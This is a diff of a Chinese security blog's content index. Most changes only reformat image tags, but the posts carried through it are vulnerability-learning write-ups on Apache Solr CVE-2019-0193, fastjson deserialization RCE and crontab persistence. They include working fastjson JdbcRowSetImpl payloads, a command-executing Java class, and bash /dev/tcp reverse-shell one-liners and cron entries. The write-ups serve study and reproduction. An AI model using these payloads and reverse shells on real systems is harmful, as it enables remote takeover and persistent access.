+</code></pre><p>返回200 则可用该版本可行检测，500 则不行<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679484163317.jpg" alt="-w1263"></p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.ishenping.com/ArtInfo/1196947.html" target="_blank" rel="noopener">solr源码通过idea进行本地调试</a><br><a href="https://github.com/jas502n/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-0193</a><br><a href="https://github.com/Imanfeng/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/Imanfeng/CVE-2019-0193</a><br><a href="https://github.com/1135/solr_exploit#%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E---exploit1" target="_blank" rel="noopener">https://github.com/1135/solr_exploit#%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E—exploit1</a></p>
 ]]></content>
       
@@ -575,9 +579,9 @@ Connection: close
         
         <tags>
             
-            <tag> 漏洞学习 </tag>
-            
             <tag> web 渗透 </tag>
+            
+            <tag> 漏洞学习 </tag>
             
             <tag> Apache Solr CVE-2019-0193 </tag>
             
@@ -619,11 +623,11 @@ User user1 <span class="token operator">=</span> JSON<span class="token punctuat
 String jsonString2 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>SerializerFeature<span class="token punctuation">.</span>WriteClassName<span class="token punctuation">)</span>
 User user3 <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>jsonString2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过parse方法进行反序列化</span>
 </code></pre>
-<p><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643184131156.jpg" data-fancybox="group" data-caption="-w679" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643184131156.jpg" alt="-w679" title="-w679"></a><br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643184541626.jpg" data-fancybox="group" data-caption="-w966" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643184541626.jpg" alt="-w966" title="-w966"></a></p>
-<p>在进行反序列化的时候，这里显示autoType不支持<br>这个地方也正好是fastjson出现反序列化漏洞的地方。<br>代码位置：/repository/com/alibaba/fastjson/1.2.45/fastjson-1.2.45.jar!/com/alibaba/fastjson/parser/ParserConfig.class<br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643187948237.jpg" data-fancybox="group" data-caption="-w734" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643187948237.jpg" alt="-w734" title="-w734"></a><br>这里抛出异常主要是自1.2.25及之后的版本，禁用了部分autotype的功能，也就是”@type”这种指定类型的功能会被限制在一定范围内使用。<br>而由于反序列化对象时，需要检查是否开启了autotype。所以如果反序列化检查时，autotype没有开启，就会报错。因此把测试的fastjson版本改成1.2.23<br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643191763023.jpg" data-fancybox="group" data-caption="-w492" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643191763023.jpg" alt="-w492" title="-w492"></a></p>
-<p>此时测试就可以通过<br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643191936440.jpg" data-fancybox="group" data-caption="-w738" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643191936440.jpg" alt="-w738" title="-w738"></a></p>
-<h4 id="fastjson-1-2-24前测试"><a href="#fastjson-1-2-24前测试" class="headerlink" title="fastjson 1.2.24前测试"></a>fastjson 1.2.24前测试</h4><p>盗图一张<br>fastjson反序列化流程<br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643198176333.jpg" data-fancybox="group" data-caption="-w875" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643198176333.jpg" alt="-w875" title="-w875"></a></p>
-<p>在该反序列化漏洞中测试，新特性SerializerFeature.WriteClassName反序列化。<br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643268573584.jpg" data-fancybox="group" data-caption="-w885" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643268573584.jpg" alt="-w885" title="-w885"></a></p>
+<p><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643184131156.jpg" alt="-w679"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643184541626.jpg" alt="-w966"></p>
+<p>在进行反序列化的时候，这里显示autoType不支持<br>这个地方也正好是fastjson出现反序列化漏洞的地方。<br>代码位置：/repository/com/alibaba/fastjson/1.2.45/fastjson-1.2.45.jar!/com/alibaba/fastjson/parser/ParserConfig.class<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643187948237.jpg" alt="-w734"><br>这里抛出异常主要是自1.2.25及之后的版本，禁用了部分autotype的功能，也就是”@type”这种指定类型的功能会被限制在一定范围内使用。<br>而由于反序列化对象时，需要检查是否开启了autotype。所以如果反序列化检查时，autotype没有开启，就会报错。因此把测试的fastjson版本改成1.2.23<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643191763023.jpg" alt="-w492"></p>
+<p>此时测试就可以通过<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643191936440.jpg" alt="-w738"></p>
+<h4 id="fastjson-1-2-24前测试"><a href="#fastjson-1-2-24前测试" class="headerlink" title="fastjson 1.2.24前测试"></a>fastjson 1.2.24前测试</h4><p>盗图一张<br>fastjson反序列化流程<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643198176333.jpg" alt="-w875"></p>
+<p>在该反序列化漏洞中测试，新特性SerializerFeature.WriteClassName反序列化。<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643268573584.jpg" alt="-w885"></p>
 <h5 id="SerializerFeature-WriteClassName"><a href="#SerializerFeature-WriteClassName" class="headerlink" title="SerializerFeature.WriteClassName"></a>SerializerFeature.WriteClassName</h5><ul>
 <li><p>实例化测试<br>根据<a href="http://rui0.cn/archives/950" target="_blank" rel="noopener">探秘Java反序列化漏洞四：Fastjson反序列化漏洞分析</a>里面的介绍有点改动</p>
 <ul>
@@ -634,7 +638,7 @@ User user3 <span class="token operator">=</span> <span class="token punctuation"
 </li>
 </ul>
 <pre><code>-   坑二：内部类反序列化问题
-</code></pre><p><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643291877645.jpg" data-fancybox="group" data-caption="-w858" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643291877645.jpg" alt="-w858" title="-w858"></a><br>此处只能使用parse<br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643292138070.jpg" data-fancybox="group" data-caption="-w699" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643292138070.jpg" alt="-w699" title="-w699"></a></p>
+</code></pre><p><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643291877645.jpg" alt="-w858"><br>此处只能使用parse<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643292138070.jpg" alt="-w699"></p>
 <p>模拟流程如下：</p>
 <pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>fastmaven<span class="token punctuation">.</span>service<span class="token punctuation">;</span>
 <span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span>
@@ -672,10 +676,10 @@ User user3 <span class="token operator">=</span> <span class="token punctuation"
 <span class="token punctuation">}</span>
 
 </code></pre>
-<p>代码执行如下：<br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643294688396.jpg" data-fancybox="group" data-caption="-w583" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643294688396.jpg" alt="-w583" title="-w583"></a></p>
-<p><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643292686330.jpg" data-fancybox="group" data-caption="-w1420" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643292686330.jpg" alt="-w1420" title="-w1420"></a></p>
-<h5 id="流程跟踪"><a href="#流程跟踪" class="headerlink" title="流程跟踪"></a>流程跟踪</h5><p>这里跟参照的文章有点不一样，但最后还是JSONLexerBase.java 后进行命令执行，然后报错，但此时代码已经执行了。<br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643298281257.jpg" data-fancybox="group" data-caption="-w977" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643298281257.jpg" alt="-w977" title="-w977"></a><br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643298924797.jpg" data-fancybox="group" data-caption="-w1023" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643298924797.jpg" alt="-w1023" title="-w1023"></a><br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643299811746.jpg" data-fancybox="group" data-caption="-w885" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643299811746.jpg" alt="-w885" title="-w885"></a><br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643300069714.jpg" data-fancybox="group" data-caption="-w1024" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643300069714.jpg" alt="-w1024" title="-w1024"></a><br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643301009451.jpg" data-fancybox="group" data-caption="-w977" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643301009451.jpg" alt="-w977" title="-w977"></a><br><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643301793013.jpg" data-fancybox="group" data-caption="-w592" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643301793013.jpg" alt="-w592" title="-w592"></a></p>
-<p><a href="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643305824826.jpg" data-fancybox="group" data-caption="-w1319" class="fancybox"><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643305824826.jpg" alt="-w1319" title="-w1319"></a></p>
+<p>代码执行如下：<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643294688396.jpg" alt="-w583"></p>
+<p><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643292686330.jpg" alt="-w1420"></p>
+<h5 id="流程跟踪"><a href="#流程跟踪" class="headerlink" title="流程跟踪"></a>流程跟踪</h5><p>这里跟参照的文章有点不一样，但最后还是JSONLexerBase.java 后进行命令执行，然后报错，但此时代码已经执行了。<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643298281257.jpg" alt="-w977"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643298924797.jpg" alt="-w1023"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643299811746.jpg" alt="-w885"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643300069714.jpg" alt="-w1024"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643301009451.jpg" alt="-w977"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643301793013.jpg" alt="-w592"></p>
+<p><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643305824826.jpg" alt="-w1319"></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20远程反序列化poc的构造和分析/" target="_blank" rel="noopener">fastjson 远程反序列化poc的构造和分析</a><br><a href="http://rui0.cn/archives/950" target="_blank" rel="noopener">探秘Java反序列化漏洞四：Fastjson反序列化漏洞分析</a></p>
 ]]></content>
       
@@ -692,9 +696,9 @@ User user3 <span class="token operator">=</span> <span class="token punctuation"
         
         <tags>
             
-            <tag> 漏洞学习 </tag>
-            
             <tag> web 渗透 </tag>
+            
+            <tag> 漏洞学习 </tag>
             
             <tag> fastjson </tag>
             
@@ -1124,9 +1128,9 @@ http://blog.nsfocus.net/xss-advance/#23_DOM
         
         <tags>
             
-            <tag> XSS </tag>
-            
             <tag> Web安全 </tag>
+            
+            <tag> XSS </tag>
             
         </tags>
         
@@ -1136,7 +1140,7 @@ http://blog.nsfocus.net/xss-advance/#23_DOM
       <title><![CDATA[fastjson 1.2.47 rce]]></title>
       <url>/2019/07/18/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/fastjson/</url>
       <content type="html"><![CDATA[<p>[TOC]</p>
-<h1 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson 1.2.47 rce"></a>fastjson 1.2.47 rce</h1><p>在渗透测试中 发现了fastjson的有漏洞的版本，<br><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15640447555647.jpg" data-fancybox="group" data-caption="-w682" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640447555647.jpg" alt="-w682" title="-w682"></a></p>
+<h1 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson 1.2.47 rce"></a>fastjson 1.2.47 rce</h1><p>在渗透测试中 发现了fastjson的有漏洞的版本，<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640447555647.jpg" alt="-w682"></p>
 <p>想着尝试下</p>
 <h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>恶意攻击者可以构造攻击请求绕过FastJSON的黑名单策略。例如，攻击者通过精心构造的请求，远程让服务端执行指定命令</p>
 <h2 id="对应payload"><a href="#对应payload" class="headerlink" title="对应payload"></a>对应payload</h2><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
@@ -1151,14 +1155,14 @@ http://blog.nsfocus.net/xss-advance/#23_DOM
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 </code></pre>
-<p><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15633821836741.jpg" data-fancybox="group" data-caption="-w497" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15633821836741.jpg" alt="-w497" title="-w497"></a></p>
-<p><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15640448645384.jpg" data-fancybox="group" data-caption="-w1093" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640448645384.jpg" alt="-w1093" title="-w1093"></a></p>
+<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15633821836741.jpg" alt="-w497"></p>
+<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640448645384.jpg" alt="-w1093"></p>
 <p>此处简单测试了利用该命令漏洞会去请求exploit。<br>这个漏洞的利用方式跟18年的fastjson反序列化漏洞比较类似，这里先看下18年的fastjson漏洞，跟着分析下</p>
-<h2 id="FastJson-JdbcRowSetImpl"><a href="#FastJson-JdbcRowSetImpl" class="headerlink" title="FastJson-JdbcRowSetImpl"></a>FastJson-JdbcRowSetImpl</h2><h3 id="搭建漏洞环境"><a href="#搭建漏洞环境" class="headerlink" title="搭建漏洞环境"></a>搭建漏洞环境</h3><p>根据<a href="https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">FastJson-JdbcRowSetImpl</a>搭建该漏洞环境，进行测试, 该漏洞环境<br><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15637129821308.jpg" data-fancybox="group" data-caption="-w908" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637129821308.jpg" alt="-w908" title="-w908"></a></p>
+<h2 id="FastJson-JdbcRowSetImpl"><a href="#FastJson-JdbcRowSetImpl" class="headerlink" title="FastJson-JdbcRowSetImpl"></a>FastJson-JdbcRowSetImpl</h2><h3 id="搭建漏洞环境"><a href="#搭建漏洞环境" class="headerlink" title="搭建漏洞环境"></a>搭建漏洞环境</h3><p>根据<a href="https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">FastJson-JdbcRowSetImpl</a>搭建该漏洞环境，进行测试, 该漏洞环境<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637129821308.jpg" alt="-w908"></p>
 <h4 id="开启http服务"><a href="#开启http服务" class="headerlink" title="开启http服务"></a>开启http服务</h4><pre><code>Python3 -m http.server 80
 </code></pre><h4 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h4><pre><code>java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar &lt;HTTP服务地址&gt; 指定RMI端口
-</code></pre><h4 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h4><p><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15640449119775.jpg" data-fancybox="group" data-caption="-w1197" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640449119775.jpg" alt="-w1197" title="-w1197"></a></p>
-<p>poc 如下<br><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15637154042668.jpg" data-fancybox="group" data-caption="-w756" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637154042668.jpg" alt="-w756" title="-w756"></a></p>
+</code></pre><h4 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h4><p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640449119775.jpg" alt="-w1197"></p>
+<p>poc 如下<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637154042668.jpg" alt="-w756"></p>
 <pre class=" language-java"><code class="language-java"><span class="token keyword">import</span>    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
 <span class="token keyword">import</span>    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>
 <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommandObject</span> <span class="token punctuation">{</span>
@@ -1183,9 +1187,9 @@ http://blog.nsfocus.net/xss-advance/#23_DOM
 <span class="token punctuation">}</span>
 
 </code></pre>
-<p><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15637155154519.jpg" data-fancybox="group" data-caption="-w1156" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637155154519.jpg" alt="-w1156" title="-w1156"></a></p>
+<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637155154519.jpg" alt="-w1156"></p>
 <h4 id="反弹shell-测试"><a href="#反弹shell-测试" class="headerlink" title="反弹shell 测试"></a>反弹shell 测试</h4><pre><code>String[] commands = {&quot;bash -i &gt;&amp; /dev/tcp/ip/8550 0&gt;&amp;1&quot;};
-</code></pre><p>将此处直接修改为该命令，发现结果不行，直接运行该commandobject程序<br><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15637230154421.jpg" data-fancybox="group" data-caption="-w1112" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637230154421.jpg" alt="-w1112" title="-w1112"></a><br>结果发现是zsh 不支持，切换个,网上一堆用如下java反弹shell的写法，结果发现在1.8的jdk，一直不符合格式</p>
+</code></pre><p>将此处直接修改为该命令，发现结果不行，直接运行该commandobject程序<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637230154421.jpg" alt="-w1112"><br>结果发现是zsh 不支持，切换个,网上一堆用如下java反弹shell的写法，结果发现在1.8的jdk，一直不符合格式</p>
 <pre><code>String[] commands = [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[];
 </code></pre><p>修改后如下,可以反弹shell，还有其他方式暂时未试，详情看<a href="https://blog.spoock.com/2018/11/07/java-reverse-shell/" target="_blank" rel="noopener">使用java反弹shell</a></p>
 <pre class=" language-java"><code class="language-java">
@@ -1209,7 +1213,7 @@ http://blog.nsfocus.net/xss-advance/#23_DOM
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 </code></pre>
-<p><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15640450186979.jpg" data-fancybox="group" data-caption="-w1006" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640450186979.jpg" alt="-w1006" title="-w1006"></a></p>
+<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640450186979.jpg" alt="-w1006"></p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据分析，这次遇到的fastjson漏洞不是最近1.2.47版本的，而是之前1.2.24<br>此处反编译的<br>FastJson_JdbcRowSetImpl_JNDI_RMIServer如下<br>创建rmi（java 本身的rpc框架） </p>
 <pre class=" language-java"><code class="language-java">
 <span class="token keyword">import</span> cn<span class="token punctuation">.</span>com<span class="token punctuation">.</span>topsec<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>FastJson_JdbcRowSetImpl_JNDI_RMIServer<span class="token punctuation">;</span>
@@ -1297,7 +1301,7 @@ public class RMIServer {
 
 <span class="token punctuation">}</span>
 </code></pre>
-<p><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15637303551208.jpg" data-fancybox="group" data-caption="-w1227" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637303551208.jpg" alt="-w1227" title="-w1227"></a></p>
+<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637303551208.jpg" alt="-w1227"></p>
 <p>整理下 利用方式<br>【1】首先准备一个 RMI Server<br>【2】开启对应的httpserver<br>【3】CommandObject.class 执行文件<br>【4】利用poc</p>
 <h3 id="1-2-47-与1-2-24的区别"><a href="#1-2-47-与1-2-24的区别" class="headerlink" title="1.2.47 与1.2.24的区别"></a>1.2.47 与1.2.24的区别</h3><p>在该漏洞情况下 poc与1.2.47 稍有区别<br>1.2.24 poc如下</p>
 <pre><code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:389/obj&quot;,&quot;autoCommit&quot;:true}
@@ -1313,7 +1317,7 @@ public class RMIServer {
         &quot;autoCommit&quot;: true
     }
 }
-</code></pre><h3 id="绕过分析-待续"><a href="#绕过分析-待续" class="headerlink" title="绕过分析-待续"></a>绕过分析-待续</h3><h2 id="fastjson黑名单"><a href="#fastjson黑名单" class="headerlink" title="fastjson黑名单"></a>fastjson黑名单</h2><p>在1.2.48的补丁中将 “java.lang.Class”给进行拉黑处理了<br><a href="/2019/07/18/Web渗透/漏洞学习/fastjson/15637315127442.jpg" data-fancybox="group" data-caption="-w748" class="fancybox"><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637315127442.jpg" alt="-w748" title="-w748"></a></p>
+</code></pre><h3 id="绕过分析-待续"><a href="#绕过分析-待续" class="headerlink" title="绕过分析-待续"></a>绕过分析-待续</h3><h2 id="fastjson黑名单"><a href="#fastjson黑名单" class="headerlink" title="fastjson黑名单"></a>fastjson黑名单</h2><p>在1.2.48的补丁中将 “java.lang.Class”给进行拉黑处理了<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637315127442.jpg" alt="-w748"></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">fastjson-blacklist</a><br><a href="https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">FastJson-JdbcRowSetImpl</a><br><a href="https://blog.spoock.com/2018/11/07/java-reverse-shell/" target="_blank" rel="noopener">使用java反弹shell</a><br><a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">fastjson =&lt; 1.2.47 反序列化漏洞浅析</a></p>
 ]]></content>
       
@@ -1377,7 +1381,7 @@ MAILTO=root
 # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
 # |  |  |  |  |
 # *  *  *  *  * user-name  command to be executed
-</code></pre><p>配置文件为/etc/crontab<br>存放执行的crontab脚本文件的路径为/etc/cron.d<br>存放每个用户的crontab任务的目录在debian系统中一般为/var/spool/cron/crontabs，centos系统中一般为/var/spool/cron<br><a href="/2019/07/11/内网渗透/计划任务/15624920243890.jpg" data-fancybox="group" data-caption="-w293" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15624920243890.jpg" alt="-w293" title="-w293"></a></p>
+</code></pre><p>配置文件为/etc/crontab<br>存放执行的crontab脚本文件的路径为/etc/cron.d<br>存放每个用户的crontab任务的目录在debian系统中一般为/var/spool/cron/crontabs，centos系统中一般为/var/spool/cron<br><img src="/2019/07/11/内网渗透/计划任务/15624920243890.jpg" alt="-w293"></p>
 <h2 id="利用crontab-反弹shell"><a href="#利用crontab-反弹shell" class="headerlink" title="利用crontab 反弹shell"></a>利用crontab 反弹shell</h2><p>常见的通过corntab反弹shell方法</p>
 <h3 id="bash-反弹shell"><a href="#bash-反弹shell" class="headerlink" title="bash 反弹shell"></a>bash 反弹shell</h3><p>测试设备<br>A：服务端 centos<br>B：客户端 ubuntu</p>
 <pre><code>bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
@@ -1391,8 +1395,8 @@ MAILTO=root
 1.  标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； 
 2.  标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； 
 3.  标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;
-</code></pre><p>其中 “&gt;&amp;” 和 “&amp;&gt;”的效果一样都是将标准错误输出重定向到标准输出，即和”&gt; xxx 2&gt;&amp;1”是一样的。<br>这里的”&amp;”  类似于取地址符<br><a href="/2019/07/11/内网渗透/计划任务/15624937292291.jpg" data-fancybox="group" data-caption="-w1435" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15624937292291.jpg" alt="-w1435" title="-w1435"></a><br>此处 客户端的输入和输出都在服务端上展示，服务端无法直接输入<br><a href="/2019/07/11/内网渗透/计划任务/15624942091590.jpg" data-fancybox="group" data-caption="-w1438" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15624942091590.jpg" alt="-w1438" title="-w1438"></a></p>
-<p>在man bash 里面解释为<br><a href="/2019/07/11/内网渗透/计划任务/15624986811057.jpg" data-fancybox="group" data-caption="-w709" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15624986811057.jpg" alt="-w709" title="-w709"></a><br>同理   “n&lt;&amp;word” 是word复制给n， “n&gt;&amp;word”是把word复制给n<br>“0&gt;&amp;1”就是把 0对应的设备改成的1对应的设备，那也就是socket。这就表明了 stdin就是从socket中读取数据，然后再执行命令，把bash的命令行返回内容通过stdout发到socket。<br><a href="/2019/07/11/内网渗透/计划任务/15624989415170.jpg" data-fancybox="group" data-caption="-w712" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15624989415170.jpg" alt="-w712" title="-w712"></a></p>
+</code></pre><p>其中 “&gt;&amp;” 和 “&amp;&gt;”的效果一样都是将标准错误输出重定向到标准输出，即和”&gt; xxx 2&gt;&amp;1”是一样的。<br>这里的”&amp;”  类似于取地址符<br><img src="/2019/07/11/内网渗透/计划任务/15624937292291.jpg" alt="-w1435"><br>此处 客户端的输入和输出都在服务端上展示，服务端无法直接输入<br><img src="/2019/07/11/内网渗透/计划任务/15624942091590.jpg" alt="-w1438"></p>
+<p>在man bash 里面解释为<br><img src="/2019/07/11/内网渗透/计划任务/15624986811057.jpg" alt="-w709"><br>同理   “n&lt;&amp;word” 是word复制给n， “n&gt;&amp;word”是把word复制给n<br>“0&gt;&amp;1”就是把 0对应的设备改成的1对应的设备，那也就是socket。这就表明了 stdin就是从socket中读取数据，然后再执行命令，把bash的命令行返回内容通过stdout发到socket。<br><img src="/2019/07/11/内网渗透/计划任务/15624989415170.jpg" alt="-w712"></p>
 <p>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/</p>
 <h3 id="crontab-反弹-shell"><a href="#crontab-反弹-shell" class="headerlink" title="crontab 反弹 shell"></a>crontab 反弹 shell</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><p>crontab -e<br>选择常见编辑器后，写入执行命令</p>
 <pre><code>*/1 * * * * bash -i &amp;&gt; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
@@ -1401,31 +1405,31 @@ MAILTO=root
 <pre><code>/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;
 </code></pre><p>别忘了重启</p>
 <pre><code>/etc/init.d/cron restart
-</code></pre><p>在ubuntu中 踩了个大坑，这条命令在centos中可以执行，但是在ubuntu中不行。<br>检查日志 “/var/log/syslog” 发现计划任务执行了，但是结果没建立连接<br><a href="/2019/07/11/内网渗透/计划任务/15625034967756.jpg" data-fancybox="group" data-caption="-w888" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15625034967756.jpg" alt="-w888" title="-w888"></a><br><a href="/2019/07/11/内网渗透/计划任务/15625035284231.jpg" data-fancybox="group" data-caption="-w887" class="fancybox"><img src="/2019/07/11/内网渗透/计划任务/15625035284231.jpg" alt="-w887" title="-w887"></a></p>
